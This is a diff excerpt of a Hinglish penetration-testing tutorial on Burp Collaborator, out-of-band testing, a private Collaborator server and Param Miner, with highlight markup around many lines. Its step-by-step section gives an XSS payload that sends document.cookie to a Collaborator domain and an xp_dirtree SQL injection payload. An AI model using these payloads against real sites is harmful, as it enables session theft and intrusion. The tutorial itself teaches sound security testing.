-**Problem:** Kayi vulnerabilities aisi hoti hain jinka response server directly nahi deta. Jaise **Blind SQL Injection** mein server error nahi dikhata, ya **Blind SSRF** mein server kisi internal system ko request to bhejta hai par us system ka response attacker ko nahi milta. Tum directly nahi dekh sakte ki vulnerability exist karti hai ya nahi.
-- **Example Scenario:** Tumne ek form mein payload daala `' OR 1=1; --`. Server ne kuch error nahi diya. Tum kya karoge? Kaise pata chalega ki SQL injection hai?
-**Solution:** OAST is problem solve karta hai. Tum payload mein apna Collaborator domain daalte ho. Agar server vulnerable hai, to woh Collaborator se contact karega – jaise DNS lookup karega ya HTTP request bhejega. Jab tum Collaborator client mein "Poll Now" karoge to interaction dikhega. Isse pata chal jayega ki vulnerability hai, bina server ke direct response ke.
+[[HL::**Problem:** Kayi vulnerabilities aisi hoti hain jinka response server directly nahi deta. Jaise **Blind SQL Injection** mein server error nahi dikhata, ya **Blind SSRF** mein server kisi internal system ko request to bhejta hai par us system ka response attacker ko nahi milta. Tum directly nahi dekh sakte ki vulnerability exist karti hai ya nahi::HL]].
+- [[HL::**Example Scenario:** Tumne ek form mein payload daala `' OR 1=1; --`. Server ne kuch error nahi diya. Tum kya karoge? Kaise pata chalega ki SQL injection hai?::HL]]
+[[HL::**Solution:** OAST is problem solve karta hai. Tum payload mein apna Collaborator domain daalte ho. Agar server vulnerable hai, to woh Collaborator se contact karega – jaise DNS lookup karega ya HTTP request bhejega. Jab tum Collaborator client mein "Poll Now" karoge to interaction dikhega. Isse pata chal jayega ki vulnerability hai, bina server ke direct response ke::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
-Jab tum Burp Collaborator client khologe, screen par ye dikhega:
-- **Location:** Burp Suite ke upar tabs mein **"Burp Collaborator client"** namak ek tab hoga. (Burp Pro mein hota hai, Community edition mein nahi – but community mein bhi manual setup kar sakte ho ya online collaborator use kar sakte ho.)
-- **Appearance:** Ek window with two main sections:
-  - Upar ek button **"Copy to clipboard"** ke saath ek unique domain dikhega (e.g., `xyz123.burpcollaborator.net`).
-  - Neeche ek button **"Poll now"** hai, aur uske neeche ek blank area jahan interactions list honge.
-  - Har interaction mein timestamp, interaction type (DNS, HTTP, SMTP), source IP, request details dikhti hain.
-- **Example:** Jab koi interaction aayegi, to kuch aisa dikhega:
+[[HL::Jab tum Burp Collaborator client khologe, screen par ye dikhega:::HL]]
+- [[HL::**Location:** Burp Suite ke upar tabs mein **"Burp Collaborator client"** namak ek tab hoga. (Burp Pro mein hota hai, Community edition mein nahi – but community mein bhi manual setup kar sakte ho ya online collaborator use kar sakte ho.)::HL]]
+- [[HL::**Appearance:** Ek window with two main sections:::HL]]
+  - [[HL::Upar ek button **"Copy to clipboard"** ke saath ek unique domain dikhega (e.g., `xyz123.burpcollaborator.net`).::HL]]
+  - [[HL::Neeche ek button **"Poll now"** hai, aur uske neeche ek blank area jahan interactions list honge.::HL]]
+  - [[HL::Har interaction mein timestamp, interaction type (DNS, HTTP, SMTP), source IP, request details dikhti hain.::HL]]
+- [[HL::**Example:** Jab koi interaction aayegi, to kuch aisa dikhega::HL]]:
   ```
-  [14:32:45]  HTTP request from 203.0.113.5
-  GET / HTTP/1.1
-  Host: xyz123.burpcollaborator.net
-  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
+  [[[HL::14:32:45]  HTTP request from 203.0.113.5::HL]]
+  [[HL::GET / HTTP/1.1::HL]]
+  [[HL::Host: xyz123.burpcollaborator.net::HL]]
+  [[HL::User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64::HL]]) ...
   ```
 
 ## ⚙️ 6. Under the Hood (Technical Working):
-**Step-by-step logical flow:**
-1. **Payload generation:** Tum Burp Collaborator client mein jaakar **"Generate Collaborator Payload"** click karte ho. Burp ek **unique subdomain** generate karta hai, jaise `abc123.burpcollaborator.net`. Ye subdomain Burp ke server (ya tumhare apne server) par DNS record ke saath registered hai.
-2. **Payload injection:** Tum ye domain apne test payload mein daalte ho – jaise SQLi payload mein, ya SSRF mein, ya XSS mein – aur server ko bhejte ho.
-3. **Server interaction:** Agar server vulnerable hai, to woh tumhare diye gaye domain se interact karega. Ye interaction ho sakta hai:
-   - **DNS lookup:** Server ko domain ka IP chahiye, to DNS query karega.
-   - **HTTP request:** Server us domain par HTTP request bhejega (e.g., jab SSRF ho).
-   - **SMTP:** Agar server email send kar raha ho to us domain par email bhej sakta hai.
-4. **Interaction capture:** Burp Collaborator server (ya tumhara private server) ye sab interactions log karta hai – kaunsi IP ne request ki, kab, kya bheja, etc.
-5. **Polling:** Tum Burp Collaborator client mein **"Poll now"** click karte ho. Burp Collaborator server se puchta hai ki koi interaction aayi? Agar haan, to list dikhaata hai.
-6. **Confirmation:** Agar interaction dikhe, to vulnerability confirmed. Agar kuch nahi aaye to ya to vulnerable nahi hai, ya interaction different channel se ho raha hai (e.g., HTTPS instead of HTTP) ya time lag raha hai.
+**[[HL::Step-by-step logical flow::HL]]:**
+1. [[HL::**Payload generation:** Tum Burp Collaborator client mein jaakar **"Generate Collaborator Payload"** click karte ho. Burp ek **unique subdomain** generate karta hai, jaise `abc123.burpcollaborator.net`. Ye subdomain Burp ke server (ya tumhare apne server) par DNS record ke saath registered hai.::HL]]
+2. [[HL::**Payload injection:** Tum ye domain apne test payload mein daalte ho – jaise SQLi payload mein, ya SSRF mein, ya XSS mein – aur server ko bhejte ho.::HL]]
+3. [[HL::**Server interaction:** Agar server vulnerable hai, to woh tumhare diye gaye domain se interact karega. Ye interaction ho sakta hai:::HL]]
+   - [[HL::**DNS lookup:** Server ko domain ka IP chahiye, to DNS query karega.::HL]]
+   - [[HL::**HTTP request:** Server us domain par HTTP request bhejega (e.g., jab SSRF ho).::HL]]
+   - [[HL::**SMTP:** Agar server email send kar raha ho to us domain par email bhej sakta hai.::HL]]
+4. [[HL::**Interaction capture:** Burp Collaborator server (ya tumhara private server) ye sab interactions log karta hai – kaunsi IP ne request ki, kab, kya bheja, etc::HL]].
+5. [[HL::**Polling:** Tum Burp Collaborator client mein **"Poll now"** click karte ho. Burp Collaborator server se puchta hai ki koi interaction aayi? Agar haan, to list dikhaata hai.::HL]]
+6. [[HL::**Confirmation:** Agar interaction dikhe, to vulnerability confirmed. Agar kuch nahi aaye to ya to vulnerable nahi hai, ya interaction different channel se ho raha hai (e.g., HTTPS instead of HTTP) ya time lag raha hai::HL]].
 
 **ASCII Diagram:**
 ````
@@ -8406,56 +8406,56 @@ Jab tum Burp Collaborator client khologe, screen par ye dikhega:
 ````
 
 ## 💻 7. Hands-On: Step-by-Step Practical (CRITICAL SECTION):
-**Step 1: Collaborator Client kholo**
+[[HL::**Step 1: Collaborator Client kholo**::HL]]
 ```text
-Burp Suite mein jaao
-Top tabs mein "Burp Collaborator client" par click karo
-Pehli baar khol rahe ho to ek blank screen dikhegi
+[[HL::Burp Suite mein jaao::HL]]
+[[HL::Top tabs mein "Burp Collaborator client" par click karo::HL]]
+[[HL::Pehli baar khol rahe ho to ek blank screen dikhegi::HL]]
 ```
-**Step 2: Payload generate karo**
+[[HL::**Step 2: Payload generate karo**::HL]]
 ```text
-"Copy to clipboard" button par click karo
-Isse ek unique domain copy ho jayega, e.g., "2a3f9c.burpcollaborator.net"
-Ye domain tumhara "spy" hai
+[[HL::"Copy to clipboard" button par click karo::HL]]
+[[HL::Isse ek unique domain copy ho jayega, e.g., "2a3f9c.burpcollaborator.net"::HL]]
+[[HL::Ye domain tumhara "spy" hai::HL]]
 ```
-**Step 3: Payload ko target par bhejo**
+[[HL::**Step 3: Payload ko target par bhejo**::HL]]
 ```text
-Ab target application mein kisi bhi input field mein ye domain daalo
-Jaise search box mein: http://2a3f9c.burpcollaborator.net
-Ya kisi parameter mein: url=2a3f9c.burpcollaborator.net
-Ya SQL injection payload mein: '; exec master..xp_dirtree '\\2a3f9c.burpcollaborator.net\share' --
-Ya XSS mein: <script>fetch('http://2a3f9c.burpcollaborator.net?c='+document.cookie)</script>
+[[HL::Ab target application mein kisi bhi input field mein ye domain daalo::HL]]
+[[HL::Jaise search box mein: http://2a3f9c.burpcollaborator.net::HL]]
+[[HL::Ya kisi parameter mein: url=2a3f9c.burpcollaborator.net::HL]]
+[[HL::Ya SQL injection payload mein: '; exec master..xp_dirtree '\\2a3f9c.burpcollaborator.net\share' --::HL]]
+[[HL::Ya XSS mein: <script>fetch('http://2a3f9c.burpcollaborator.net?c='+document.cookie)</script>::HL]]
 ```
-**Step 4: Server se request bhejne do**
+[[HL::**Step 4: Server se request bhejne do**::HL]]
 ```text
-Form submit karo, ya link click karo, ya kisi bhi tareeke se payload trigger karo
-Server ab tumhare domain par request bhej sakta hai – agar vulnerable hai to
+[[HL::Form submit karo, ya link click karo, ya kisi bhi tareeke se payload trigger karo::HL]]
+[[HL::Server ab tumhare domain par request bhej sakta hai – agar vulnerable hai to::HL]]
 ```
-**Step 5: Poll now karo**
+[[HL::**Step 5: Poll now karo**::HL]]
 ```text
-Wapas Burp Collaborator client mein aao
-"Poll now" button par click karo
-Thodi der ruko (5-10 seconds)
+[[HL::Wapas Burp Collaborator client mein aao::HL]]
+[[HL::"Poll now" button par click karo::HL]]
+[[HL::Thodi der ruko (5-10 seconds::HL]])
 ```
-**Step 6: Interaction check karo**
+[[HL::**Step 6: Interaction check karo**::HL]]
 ```text
-Neeche list mein koi entry dikhe?
-Agar dikhe, to vulnerability confirmed! (e.g., DNS interaction, HTTP request)
+[[HL::Neeche list mein koi entry dikhe?::HL]]
+[[HL::Agar dikhe, to vulnerability confirmed! (e.g., DNS interaction, HTTP request)::HL]]
 ```
-**Expected Screen:**
+**[[HL::Expected Screen::HL]]:**
 ```text
-Polling...
-Received 1 interaction(s) since last poll.
+[[HL::Polling...::HL]]
+[[HL::Received 1 interaction(s) since last poll.::HL]]
 
-[14:32:45]  DNS lookup from 203.0.113.5
-Type: A record for 2a3f9c.burpcollaborator.net
+[[HL::[14:32:45]  DNS lookup from 203.0.113.5::HL]]
+[[HL::Type: A record for 2a3f9c.burpcollaborator.net::HL]]
 
-[14:32:46]  HTTP request from 203.0.113.5
-GET / HTTP/1.1
-Host: 2a3f9c.burpcollaborator.net
-User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
+[[HL::[14:32:46]  HTTP request from 203.0.113.5::HL]]
+[[HL::GET / HTTP/1.1::HL]]
+[[HL::Host: 2a3f9c.burpcollaborator.net::HL]]
+[[HL::User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)::HL]]
 ```
-Yahan `203.0.113.5` target server ki IP hai. Iska matlab server ne tumhare domain ko hit kiya – vulnerable!
+[[HL::Yahan `203.0.113.5` target server ki IP hai. Iska matlab server ne tumhare domain ko hit kiya – vulnerable::HL]]!
 
 ## ⚖️ 8. Comparison (OAST vs In-band Testing):
 | Feature | OAST (Out-of-band) | In-band Testing |
@@ -8470,8 +8470,8 @@ Yahan `203.0.113.5` target server ki IP hai. Iska matlab server ne tumhare domai
 - **Mistake 1:** Sirf HTTP interactions check karna, DNS ko ignore karna.  
   **Fix:** DNS interactions bhi equally important hain. Kayi vulnerabilities sirf DNS lookup karti hain (jaise SQL Server ki xp_dirtree). "Poll now" ke baad dono type dekho.
 
-- **Mistake 2:** Ek baar payload bheja aur turant poll kar liya.  
-  **Fix:** Server ko time do. Ho sakta hai request queue mein ho, ya asynchronous ho. 10-30 seconds wait karo, phir poll karo. Kuch cases mein minutes bhi lag sakte hain.
+- [[HL::**Mistake 2:** Ek baar payload bheja aur turant poll kar liya.::HL]]  
+  [[HL::**Fix:** Server ko time do. Ho sakta hai request queue mein ho, ya asynchronous ho. 10-30 seconds wait karo, phir poll karo. Kuch cases mein minutes bhi lag sakte hain::HL]].
 
 - **Mistake 3:** Payload mein apna domain daalna bhoolna.  
   **Fix:** Payload copy karte waqt, domain sahi se daalo. Agar automatically `§` symbols aaye to unhe hatake domain daalo. Domain ke saath protocol (http://) bhi daal sakte ho agar HTTP interaction chahiye.
@@ -8509,10 +8509,10 @@ Yahan `203.0.113.5` target server ki IP hai. Iska matlab server ne tumhare domai
 ```
 
 ## 🛠️ 13. Best Practices (Pro Tips):
-- **Tip 1:** Har baar naya payload generate karo. Purane domain ko reuse mat karo, kyunki agar kisi aur ne bhi woh domain test kiya to tumhare interactions mix ho sakte hain.
+- [[HL::**Tip 1:** Har baar naya payload generate karo. Purane domain ko reuse mat karo, kyunki agar kisi aur ne bhi woh domain test kiya to tumhare interactions mix ho sakte hain::HL]].
 - **Tip 2:** DNS interactions ko underestimate mat karo. Kayi blind vulnerabilities DNS ke through confirm hoti hain.
 - **Tip 3:** Agar target server ke paas firewall ho, to DNS allowed ho sakta hai jabki HTTP blocked ho. Isliye dono channels check karo.
-- **Tip 4:** Poll now manually karne ki bajaye, **"Poll automatically"** setting on kar do (Burp mein option hai). Har kuch seconds automatically poll hoga.
+- [[HL::**Tip 4:** Poll now manually karne ki bajaye, **"Poll automatically"** setting on kar do (Burp mein option hai). Har kuch seconds automatically poll hoga::HL]].
 - **Tip 5:** Collaborator domain ko payload mein multiple jagah daalo – headers mein (Referer, X-Forwarded-For), parameters mein, XML data mein, etc.
 
 ## ⚠️ 14. Consequences of Failure (Agar galat kiya toh?):
@@ -8524,8 +8524,8 @@ Yahan `203.0.113.5` target server ki IP hai. Iska matlab server ne tumhare domai
 - **Q1:** OAST kya hai aur kab use karte hain?  
   **A1:** OAST (Out-of-band Application Security Testing) ek technique hai jisme hum external server ka use karke blind vulnerabilities detect karte hain, jab server direct response nahi deta.
 
-- **Q2:** Burp Collaborator kaise kaam karta hai?  
-  **A2:** Burp Collaborator ek server hai jo unique subdomains provide karta hai. Jab vulnerable server us subdomain se interact karta hai (DNS, HTTP, etc.), to Burp use log karta hai. Attacker poll karke dekh sakta hai ki interaction hui ya nahi.
+- [[HL::**Q2:** Burp Collaborator kaise kaam karta hai?::HL]]  
+  [[HL::**A2:** Burp Collaborator ek server hai jo unique subdomains provide karta hai. Jab vulnerable server us subdomain se interact karta hai (DNS, HTTP, etc.), to Burp use log karta hai. Attacker poll karke dekh sakta hai ki interaction hui ya nahi::HL]].
 
 - **Q3:** DNS interaction ka matlab kya hai?  
   **A3:** DNS interaction matlab server ne tumhare domain ka IP address puchne ki koshish ki. Ye is baat ka proof hai ki server ne tumhara data process kiya aur external resource access kiya – vulnerability ka indicator.
@@ -8549,7 +8549,7 @@ Yahan `203.0.113.5` target server ki IP hai. Iska matlab server ne tumhare domai
 Jaise tumhe ek naya mobile phone mila hai, to pehle use setup karna padta hai – SIM lagao, WiFi connect karo, etc. Waise hi **Collaborator Client** ko use karne ke liye pehle usse samajhna hoga ki kaise payload generate karein, kaise poll karein. Ye ek tarah ka **control room** hai jahan se tum apne spy (collaborator domain) ko monitor karoge.
 
 ## 📖 3. Technical Definition (Interview Answer):
-**Burp Collaborator Client** Burp Suite Pro ka ek built-in tool hai jo ek **unique, interactable domain** generate karta hai. Is domain ko tum payload mein daal kar target server ko bhejte ho. Baad mein client ke through **poll** karke dekh sakte ho ki server ne koi interaction (DNS, HTTP, SMTP) kiya ya nahi. Ye blind vulnerabilities detect karne ka primary interface hai.
+[[HL::**Burp Collaborator Client** Burp Suite Pro ka ek built-in tool hai jo ek **unique, interactable domain** generate karta hai. Is domain ko tum payload mein daal kar target server ko bhejte ho. Baad mein client ke through **poll** karke dekh sakte ho ki server ne koi interaction (DNS, HTTP, SMTP) kiya ya nahi. Ye blind vulnerabilities detect karne ka primary interface hai::HL]].
 
 **Breakdown:**
 - **Burp Collaborator:** Burp Suite ka ek component jo ek remote server (ya local) chalata hai jo interactions log karta hai.
@@ -8562,11 +8562,11 @@ Jaise tumhe ek naya mobile phone mila hai, to pehle use setup karna padta hai �
 **Solution:** Collaborator Client wahi window hai. Yahan tum payload generate karoge, aur yahan tum dekho ge ki server ne tumhara domain hit kiya ya nahi. Agar hit kiya, to vulnerability hai.
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
-- **Location:** Burp Suite mein top menu bar mein "Burp" ke neeche tabs hote hain – "Target", "Proxy", "Intruder"... inke beech mein **"Burp Collaborator client"** namak tab hoga. (Agar nahi dikhe to check karo ki Burp Pro use kar rahe ho, ya community edition mein manual setup kiya hai.)
-- **Appearance:**
-  - Sabse upar ek text field hota hai jisme current payload domain likha hota hai (e.g., `2a3f9c.burpcollaborator.net`).
-  - Uske right mein ek **"Copy to clipboard"** button.
-  - Neeche do buttons: **"Poll now"** aur **"Poll automatically"** checkbox.
+- [[HL::**Location:** Burp Suite mein top menu bar mein "Burp" ke neeche tabs hote hain – "Target", "Proxy", "Intruder"... inke beech mein **"Burp Collaborator client"** namak tab hoga. (Agar nahi dikhe to check karo ki Burp Pro use kar rahe ho, ya community edition mein manual setup kiya hai::HL]].)
+- **[[HL::Appearance::HL]]:**
+  - [[HL::Sabse upar ek text field hota hai jisme current payload domain likha hota hai (e.g., `2a3f9c.burpcollaborator.net`).::HL]]
+  - [[HL::Uske right mein ek **"Copy to clipboard"** button.::HL]]
+  - [[HL::Neeche do buttons: **"Poll now"** aur **"Poll automatically"** checkbox::HL]].
   - Uski neeche ek large blank area jahan interactions list hoti hai, with columns: Time, Type, Details.
   - Kuch versions mein additional tabs hote hain jaise "HTTP", "DNS", "SMTP" to filter interactions.
 - **Example:** Jab interaction aati hai to list mein entry dikhti hai, expand karne par full details.
@@ -8578,42 +8578,42 @@ Jaise tumhe ek naya mobile phone mila hai, to pehle use setup karna padta hai �
 4. **Interaction Storage:** Server interactions ko kuch der store rakhta hai (typically 1 hour) taaki tum poll kar sako.
 
 ## 💻 7. Hands-On: Step-by-Step Practical:
-**Step 1: Collaborator Client tab kholo**
+[[HL::**Step 1: Collaborator Client tab kholo**::HL]]
 ```text
-Burp Suite open karo
-Top tabs scroll karo ya "Burp" menu mein dekh kar "Burp Collaborator client" par click karo
-Agar nahi dikh raha to "View" -> "Show tabs" check karo
+[[HL::Burp Suite open karo::HL]]
+[[HL::Top tabs scroll karo ya "Burp" menu mein dekh kar "Burp Collaborator client" par click karo::HL]]
+[[HL::Agar nahi dikh raha to "View" -> "Show tabs" check karo::HL]]
 ```
-**Step 2: Payload generate karo**
+[[HL::**Step 2: Payload generate karo**::HL]]
 ```text
-Screen par ek button hoga "Generate Collaborator Payload" ya seedha ek domain show hoga
-Agar domain nahi hai to "Generate" click karo
-Ek naya unique domain generate hoga
-"Copy to clipboard" click karo
-Ab ye domain tumhare clipboard mein copy ho gaya
+[[HL::Screen par ek button hoga "Generate Collaborator Payload" ya seedha ek domain show hoga::HL]]
+[[HL::Agar domain nahi hai to "Generate" click karo::HL]]
+[[HL::Ek naya unique domain generate hoga::HL]]
+[[HL::"Copy to clipboard" click karo::HL]]
+[[HL::Ab ye domain tumhare clipboard mein copy ho gaya::HL]]
 ```
-**Step 3: Payload ko test mein use karo**
+[[HL::**Step 3: Payload ko test mein use karo**::HL]]
 ```text
-Ab target application mein jaakar payload bhejo (jaise SQLi, SSRF, XSS)
-Domain ko sahi format mein daalo – e.g., http://<domain> ya sirf domain
+[[HL::Ab target application mein jaakar payload bhejo (jaise SQLi, SSRF, XSS)::HL]]
+[[HL::Domain ko sahi format mein daalo – e.g., http://<domain> ya sirf domain::HL]]
 ```
-**Step 4: Poll now karo**
+[[HL::**Step 4: Poll now karo**::HL]]
 ```text
-Wapas Burp Collaborator client mein aao
-"Poll now" button click karo
-Dekho neeche list mein kuch aata hai ya nahi
+[[HL::Wapas Burp Collaborator client mein aao::HL]]
+[[HL::"Poll now" button click karo::HL]]
+[[HL::Dekho neeche list mein kuch aata hai ya nahi::HL]]
 ```
-**Step 5: Agar automatically poll karna hai to**
+[[HL::**Step 5: Agar automatically poll karna hai to**::HL]]
 ```text
-"Poll automatically" checkbox tick kar do
-Ab har 5 second mein apne aap poll hoga
-Jab nayi interaction aayegi to list update ho jayegi
+[[HL::"Poll automatically" checkbox tick kar do::HL]]
+[[HL::Ab har 5 second mein apne aap poll hoga::HL]]
+[[HL::Jab nayi interaction aayegi to list update ho jayegi::HL]]
 ```
-**Expected Screen:**
+**[[HL::Expected Screen::HL]]:**
 ```text
-[14:32:45]  HTTP request from 203.0.113.5
-GET / HTTP/1.1
-Host: 2a3f9c.burpcollaborator.net
+[[HL::[14:32:45]  HTTP request from 203.0.113.5::HL]]
+[[HL::GET / HTTP/1.1::HL]]
+[[HL::Host: 2a3f9c.burpcollaborator.net::HL]]
 ...
 ```
 ## ⚖️ 8. Comparison (Collaborator Client vs Manual DNS Logger):
@@ -8626,8 +8626,8 @@ Host: 2a3f9c.burpcollaborator.net
 | **Suitable for** | Pentesters, bug bounty hunters | Advanced users needing custom control |
 
 ## 🚫 9. Common Mistakes:
-- **Mistake 1:** Poll karna bhool jana.  
-  **Fix:** "Poll automatically" on rakho, ya reminder lagao ki 10-20 sec baad poll karo.
+- [[HL::**Mistake 1:** Poll karna bhool jana.::HL]]  
+  [[HL::**Fix:** "Poll automatically" on rakho, ya reminder lagao ki 10-20 sec baad poll karo::HL]].
 - **Mistake 2:** Payload generate karte hi usko test mein use karna, but poll karte waqt domain change ho jana (agar naya generate kiya to purana kaam nahi karega).  
   **Fix:** Ek baar payload generate karo, use copy karo, aur tab tak use karo jab tak test chal raha ho. Naya tab open karo ya domain note kar lo.
 - **Mistake 3:** "Copy to clipboard" ke baad bhi domain galat paste karna (e.g., extra space).  
@@ -8636,8 +8636,8 @@ Host: 2a3f9c.burpcollaborator.net
   **Fix:** Jald se jald poll karo, preferably 1-2 minute mein.
 
 ## 🤔 10. Agar Dimag Ghoom Rahe Hai?
-- **"Log sochte hain ki Collaborator client sirf Pro version mein hai."**  
-  Actually, Burp Community edition mein bhi Collaborator client nahi hota, lekin tum **Interactsh** jaisa free tool use kar sakte ho ya apna server bana sakte ho. Burp Pro ka Collaborator integrated hai.
+- **"[[HL::Log sochte hain ki Collaborator client sirf Pro version mein hai."::HL]]**  
+  [[HL::Actually, Burp Community edition mein bhi Collaborator client nahi hota, lekin tum **Interactsh** jaisa free tool use kar sakte ho ya apna server bana sakte ho. Burp Pro ka Collaborator integrated hai::HL]].
 - **"Log sochte hain ki payload generate karna aur poll karna alag-alag sessions mein karna padta hai."**  
   Nahi, ek hi session mein kar sakte ho. Domain generate karo, use bhejo, phir poll karo. Agar bahut time baad poll karoge to interactions expire ho sakti hain.
 
@@ -8665,8 +8665,8 @@ Host: 2a3f9c.burpcollaborator.net
 - Agar public Collaborator use kar rahe ho, to kisi aur ka interaction tumhe mil sakta hai – false positive.
 
 ## ❓ 15. FAQ:
-- **Q1:** Collaborator client mein "Poll now" ka kya matlab hai?  
-  **A1:** Iska matlab hai ki tum Burp Collaborator server se puch rahe ho – "Mere is domain ke liye koi interaction aayi?" Server batata hai.
+- [[HL::**Q1:** Collaborator client mein "Poll now" ka kya matlab hai?::HL]]  
+  [[HL::**A1:** Iska matlab hai ki tum Burp Collaborator server se puch rahe ho – "Mere is domain ke liye koi interaction aayi?" Server batata hai::HL]].
 - **Q2:** Kya main ek hi domain multiple tests mein use kar sakta hoon?  
   **A2:** Kar to sakte ho, but risky hai kyunki multiple tests ki interactions mix ho sakti hain. Better hai har test ke liye naya payload.
 - **Q3:** Collaborator client mein "Poll automatically" se kya fayda?  
@@ -9031,22 +9031,22 @@ Maano tum ek gumrah ho. Tum public park mein baith kar apna kaam karte ho. Lekin
 - Production pentests ke liye compliance meet hota hai.
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
-Jab tum apna private Collaborator server setup karoge, to Burp Suite mein tumhe us server ka address configure karna hoga. Screen par:
-- **Location:** Burp Suite mein jaao **Project options** tab → **Misc** → **Collaborator** section.
-- Wahan ek option hoga: **"Use a private Collaborator server"** checkbox.
-- Phir tumhe **server URL** daalna hoga, e.g., `https://collab.example.com`.
-- Aur **polling URL** daalni hogi, e.g., `https://collab.example.com/poll`.
-- Tum apne server par bhi ek web interface bana sakte ho jahan interactions dekhe ja sakte hain (like Burp Collaborator client but hosted on your server).
+[[HL::Jab tum apna private Collaborator server setup karoge, to Burp Suite mein tumhe us server ka address configure karna hoga. Screen par:::HL]]
+- [[HL::**Location:** Burp Suite mein jaao **Project options** tab → **Misc** → **Collaborator** section.::HL]]
+- [[HL::Wahan ek option hoga: **"Use a private Collaborator server"** checkbox.::HL]]
+- [[HL::Phir tumhe **server URL** daalna hoga, e.g., `https://collab.example.com`.::HL]]
+- [[HL::Aur **polling URL** daalni hogi, e.g., `https://collab.example.com/poll`.::HL]]
+- [[HL::Tum apne server par bhi ek web interface bana sakte ho jahan interactions dekhe ja sakte hain (like Burp Collaborator client but hosted on your server::HL]]).
 
 ## ⚙️ 6. Under the Hood (Technical Working):
-1. **Server Setup:** Tum ek VPS (e.g., DigitalOcean droplet) lete ho, jisme public IP ho. Us par tum Burp Collaborator server software install karte ho (PortSwigger officially provide karta hai). Ye software DNS, HTTP, SMTP services start karta hai.
-2. **Domain Configuration:** Tum ek domain register karte ho (e.g., `collab.example.com`) aur uske DNS records configure karte ho:
-   - `A` record pointing to your VPS IP.
-   - `NS` record maybe for subdomains (if you want wildcard).
-   - Tumhare Collaborator server ko ek secret key bhi milega.
-3. **Burp Configuration:** Burp Suite Pro mein tum private Collaborator server ka URL daalte ho, aur polling URL.
-4. **Payload Generation:** Jab tum Burp mein "Generate Collaborator Payload" karte ho, to Burp tumhare private server se unique domain maangta hai (e.g., `abc123.collab.example.com`).
-5. **Interaction Handling:** Jab target server us domain se interact karta hai, to request tumhare server par aati hai, jo use log karta hai. Burp polling karta hai tumhare server se.
+1. [[HL::**Server Setup:** Tum ek VPS (e.g., DigitalOcean droplet) lete ho, jisme public IP ho. Us par tum Burp Collaborator server software install karte ho (PortSwigger officially provide karta hai). Ye software DNS, HTTP, SMTP services start karta hai.::HL]]
+2. [[HL::**Domain Configuration:** Tum ek domain register karte ho (e.g., `collab.example.com`) aur uske DNS records configure karte ho:::HL]]
+   - [[HL::`A` record pointing to your VPS IP.::HL]]
+   - [[HL::`NS` record maybe for subdomains (if you want wildcard).::HL]]
+   - [[HL::Tumhare Collaborator server ko ek secret key bhi milega.::HL]]
+3. [[HL::**Burp Configuration:** Burp Suite Pro mein tum private Collaborator server ka URL daalte ho, aur polling URL.::HL]]
+4. [[HL::**Payload Generation:** Jab tum Burp mein "Generate Collaborator Payload" karte ho, to Burp tumhare private server se unique domain maangta hai (e.g., `abc123.collab.example.com`).::HL]]
+5. [[HL::**Interaction Handling:** Jab target server us domain se interact karta hai, to request tumhare server par aati hai, jo use log karta hai. Burp polling karta hai tumhare server se::HL]].
 
 ## 💻 7. Hands-On: Step-by-Step Practical (Setting up private Collaborator server on a VPS):
 *Note: Detailed steps may vary, but this is a high-level guide.*
@@ -10533,27 +10533,27 @@ Agar race condition nahi aayi, to concurrent connections aur badhao, ya pipelini
 Maano tum ek ghar mein chhupne ki jagah dhundh rahe ho. Tumhe sirf 3 almarian dikhti hain, lekin asal mein ghar mein 10 almarian hain – baaki 7 diwar ke peeche chhupi hain. Agar tum sirf 3 almarian check karoge to kya pata chhupne ki acchi jagah milegi? Nahi. Tumhe saari almarian dhundhni hongi. **Param Miner** aisa hi karta hai – web application ke hidden parameters dhundhta hai jo UI mein dikhte nahi, lekin backend mein process hote hain. Jaise `?debug=true`, `?admin=1`, `?test=123` – ye sab hidden parameters ho sakte hain jo developer ne debug ke liye chhode hain. Param Miner unhe dhundh kar laata hai.
 
 ## 📖 3. Technical Definition (Interview Answer):
-**Param Miner** Burp Suite ka ek extension hai jo **hidden parameters aur headers** ko discover karta hai jo application accept karta hai lekin normally expose nahi hote. Ye do modes mein kaam karta hai: passive scan (background mein chalta hai, requests dekhta hai) aur active scan (wordlist se parameters brute-force karta hai). Isse cache poisoning parameters, hidden GET/POST parameters, server headers (like `X-Forwarded-For`), aur framework-specific parameters (like `_method`) detect hote hain. Ye parameters further vulnerabilities (like SQLi, XSS, access control bypass) ke potential entry points ban sakte hain.
+[[HL::**Param Miner** Burp Suite ka ek extension hai jo **hidden parameters aur headers** ko discover karta hai jo application accept karta hai lekin normally expose nahi hote. Ye do modes mein kaam karta hai: passive scan (background mein chalta hai, requests dekhta hai) aur active scan (wordlist se parameters brute-force karta hai). Isse cache poisoning parameters, hidden GET/POST parameters, server headers (like `X-Forwarded-For`), aur framework-specific parameters (like `_method`) detect hote hain. Ye parameters further vulnerabilities (like SQLi, XSS, access control bypass) ke potential entry points ban sakte hain::HL]].
 
-**Breakdown:**
-- **Hidden parameters:** Jo frontend mein form fields mein nahi hote, lekin backend unhe accept karta hai.
-- **Passive scan:** Background mein chalta hai, requests ke responses dekhta hai, parameters detect karta hai (jaise `?cb=123` cache buster).
-- **Active scan:** Tum manually request select karte ho, Param Miner us request mein common parameter names daal kar bhejta hai aur dekhta hai ki response change hota hai ya nahi.
-- **Wordlist:** Built-in parameter names ki list (hazaron entries) hoti hai.
+**[[HL::Breakdown::HL]]:**
+- [[HL::**Hidden parameters:** Jo frontend mein form fields mein nahi hote, lekin backend unhe accept karta hai.::HL]]
+- [[HL::**Passive scan:** Background mein chalta hai, requests ke responses dekhta hai, parameters detect karta hai (jaise `?cb=123` cache buster).::HL]]
+- [[HL::**Active scan:** Tum manually request select karte ho, Param Miner us request mein common parameter names daal kar bhejta hai aur dekhta hai ki response change hota hai ya nahi.::HL]]
+- [[HL::**Wordlist:** Built-in parameter names ki list (hazaron entries) hoti hai::HL]].
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
